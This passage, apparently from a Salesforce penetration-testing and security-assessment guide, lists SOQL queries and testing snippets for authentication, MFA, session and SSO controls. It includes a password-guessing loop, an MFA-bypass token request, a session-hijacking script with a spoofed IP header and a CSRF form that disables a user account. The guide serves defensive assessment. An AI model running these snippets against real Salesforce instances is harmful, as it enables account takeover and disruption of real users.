</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="w"> </span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsCustomizable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">NamespacePrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1">-- Apex classes</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Body</span><span class="p">,</span><span class="w"> </span><span class="n">LengthWithoutComments</span><span class="p">,</span><span class="w"> </span><span class="n">ApiVersion</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">       </span><span class="n">LastModifiedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">NamespacePrefix</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApexClass</span><span class="w"> </span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">NamespacePrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="c1">-- Apex triggers</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">TableEnumOrId</span><span class="p">,</span><span class="w"> </span><span class="n">Body</span><span class="p">,</span><span class="w"> </span><span class="n">ApiVersion</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">       </span><span class="n">UsageBeforeInsert</span><span class="p">,</span><span class="w"> </span><span class="n">UsageAfterInsert</span><span class="p">,</span><span class="w"> </span><span class="n">UsageBeforeUpdate</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">       </span><span class="n">UsageAfterUpdate</span><span class="p">,</span><span class="w"> </span><span class="n">UsageBeforeDelete</span><span class="p">,</span><span class="w"> </span><span class="n">UsageAfterDelete</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApexTrigger</span><span class="w"> </span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="c1">-- Visualforce pages</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Markup</span><span class="p">,</span><span class="w"> </span><span class="n">ControllerType</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="w">       </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="p">,</span><span class="w"> </span><span class="n">IsAvailableInTouch</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApexPage</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="c1">-- Lightning components</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="k">Source</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="k">FROM</span><span class="w"> </span><span class="n">LightningComponentBundle</span><span class="w"> </span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsDeleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="c1">-- REST endpoints</span>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">NamespacePrefix</span><span class="p">,</span><span class="w"> </span><span class="n">HttpMethods</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="w">       </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="k">FROM</span><span class="w"> </span><span class="n">RestResource</span><span class="w"> </span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Identifies custom code that likely contains vulnerabilities absent from standard Salesforce functionality.</p>
<hr />
<h2 id="authentication-security-assessment">Authentication Security Assessment</h2>
<h3 id="1-password-policy-evaluation">1. Password Policy Evaluation</h3>
<p><strong>Objective</strong>: Assess password requirements and account lockout policies.</p>
<p><strong>Navigation</strong>: Setup â†’ Security â†’ Password Policies</p>
<p><strong>SOQL Query</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">-- Password policy configuration (if accessible)</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">ComplexityRequirement</span><span class="p">,</span><span class="w"> </span><span class="n">MinPasswordLength</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordLockoutThreshold</span><span class="p">,</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">       </span><span class="n">LockoutInterval</span><span class="p">,</span><span class="w"> </span><span class="n">MaxPasswordAge</span><span class="p">,</span><span class="w"> </span><span class="n">MinPasswordAge</span><span class="p">,</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">       </span><span class="n">PasswordHistoryRestriction</span><span class="p">,</span><span class="w"> </span><span class="n">QuestionRestriction</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">PasswordPolicy</span>
</span></code></pre></div></p>
<p><strong>Manual Checks</strong>:
- Minimum password length (â‰¥12 recommended)
- Complexity requirements (uppercase, lowercase, numbers, symbols)
- Password history (prevent last 3-5 passwords)
- Lockout threshold (â‰¤5 failed attempts)
- Lockout duration (â‰¥15 minutes)</p>
<p><strong>Automated Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_password_policy_weakness</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test password policy enforcement&quot;&quot;&quot;</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">weak_passwords</span> <span class="o">=</span> <span class="p">[</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>        <span class="s2">&quot;password123&quot;</span><span class="p">,</span> <span class="s2">&quot;123456789&quot;</span><span class="p">,</span> <span class="s2">&quot;qwerty123&quot;</span><span class="p">,</span> 
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="s2">&quot;admin123&quot;</span><span class="p">,</span> <span class="s2">&quot;welcome123&quot;</span><span class="p">,</span> <span class="s2">&quot;Password1&quot;</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    <span class="p">]</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    <span class="n">lockout_threshold</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">weak_passwords</span><span class="p">:</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/login.jsp&quot;</span><span class="p">,</span> 
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>                               <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;pw&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>        <span class="n">lockout_threshold</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>        <span class="k">if</span> <span class="s2">&quot;invalid login&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempt </span><span class="si">{</span><span class="n">lockout_threshold</span><span class="si">}</span><span class="s2">: Weak password rejected&quot;</span><span class="p">)</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>        <span class="k">elif</span> <span class="s2">&quot;locked&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Account locked after </span><span class="si">{</span><span class="n">lockout_threshold</span><span class="si">}</span><span class="s2"> attempts&quot;</span><span class="p">)</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>            <span class="k">break</span>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="k">return</span> <span class="n">lockout_threshold</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Weak policies enable brute force and credential stuffing attacks.</p>
<h3 id="2-multi-factor-authentication-mfa-assessment">2. Multi-Factor Authentication (MFA) Assessment</h3>
<p><strong>Objective</strong>: Evaluate MFA implementation and identify potential bypasses.</p>
<p><strong>SOQL Queries</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">-- Users without MFA enrolled</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="p">,</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">       </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">()</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">TwoFactorInfo</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">UserId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Id</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">MFA_Methods</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsActive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="k">HAVING</span><span class="w"> </span><span class="n">MFA_Methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c1">-- MFA method analysis</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">UserId</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastUsedDate</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">TwoFactorInfo</span><span class="w"> </span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastUsedDate</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">NULLS</span><span class="w"> </span><span class="k">LAST</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c1">-- Profile MFA requirements</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">RequiresMfa</span>
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Profile</span>
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="c1">-- Login flow MFA requirements</span>
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">UsedForAuthentication</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span>
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Flow</span><span class="w"> </span>
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="k">WHERE</span><span class="w"> </span><span class="k">Type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;LoginFlow&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span></code></pre></div></p>
<p><strong>MFA Bypass Testing</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Test API access bypass</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://instance.salesforce.com/services/oauth2/token<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;grant_type=password&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;username=USER&amp;password=PASS&quot;</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># Test session fixation</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>document.cookie<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;sid_Client=fixed_session_value; domain=.salesforce.com; path=/&quot;</span><span class="p">;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Users without MFA are vulnerable to account takeover via credential compromise.</p>
<h3 id="3-session-security-analysis">3. Session Security Analysis</h3>
<p><strong>Objective</strong>: Evaluate session management controls and identify session-based vulnerabilities.</p>
<p><strong>Navigation</strong>: Setup â†’ Security â†’ Session Settings</p>
<p><strong>Critical Settings</strong>:
- Session Security Level: High Assurance
- Lock sessions to IP address: Enabled
- Lock sessions to domain: Enabled<br />
- Disable concurrent sessions: Enabled
- Session timeout: â‰¤2 hours
- Force logout on timeout: Enabled</p>
<p><strong>Session Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_session_hijacking</span><span class="p">(</span><span class="n">original_session</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">):</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test session hijacking from different IP&quot;&quot;&quot;</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>        <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;sid_Client=</span><span class="si">{</span><span class="n">original_session</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">target_ip</span><span class="p">,</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;AttackerAgent/1.0&#39;</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="p">}</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>        <span class="s1">&#39;https://instance.salesforce.com/home/home.jsp&#39;</span><span class="p">,</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>    <span class="p">)</span>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Session hijacking successful - IP locking not implemented&quot;</span><span class="p">)</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Session hijacking failed - IP locking active&quot;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>CSRF Testing</strong>:
<div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cm">&lt;!-- CSRF test payload --&gt;</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://instance.salesforce.com/setup/own/users.jsp&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;save&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">&gt;</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;id&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;005XX000001b0Qw&quot;</span><span class="p">&gt;</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;IsActive&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;false&quot;</span><span class="p">&gt;</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Disable User Account&quot;</span><span class="p">&gt;</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Weak session controls enable session hijacking and CSRF attacks.</p>
<h3 id="4-single-sign-on-sso-security">4. Single Sign-On (SSO) Security</h3>
<p><strong>Objective</strong>: Evaluate SSO implementation for security weaknesses and potential bypasses.</p>
<p><strong>SOQL Queries</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">-- SAML SSO settings</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Issuer</span><span class="p">,</span><span class="w"> </span><span class="n">EntityId</span><span class="p">,</span><span class="w"> </span><span class="n">IdentityLocation</span><span class="p">,</span><span class="w"> </span>
